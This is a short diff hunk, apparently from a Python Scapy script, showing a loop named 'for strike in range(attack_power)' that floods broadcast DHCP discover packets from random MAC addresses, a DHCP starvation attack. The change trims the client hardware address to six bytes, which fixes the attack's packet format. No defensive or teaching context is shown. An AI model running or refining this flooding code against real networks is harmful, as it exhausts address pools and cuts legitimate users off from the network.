@@ -16,7 +16,7 @@ for strike in range(attack_power):
         Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
-        BOOTP(chaddr=mac_bytes, xid=RandInt()) /
+        BOOTP(chaddr=mac_bytes[:6], xid=RandInt()) /
         DHCP(options=[("message-type", "discover"), "end"])
     )
 
